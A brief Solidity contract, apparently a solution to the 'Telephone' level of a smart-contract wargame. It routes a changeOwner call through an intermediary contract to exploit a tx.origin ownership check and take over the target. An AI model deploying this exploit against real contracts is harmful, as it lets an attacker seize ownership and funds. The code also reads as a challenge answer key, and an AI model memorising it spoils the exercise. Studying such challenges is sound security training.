```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external ;
}

contract TelephoneSolution {
    ITelephone tf;

    constructor(address _tf) {
        tf = ITelephone(_tf);
    }
    
    function solve() external {
        tf.changeOwner(msg.sender);
    }
}
```
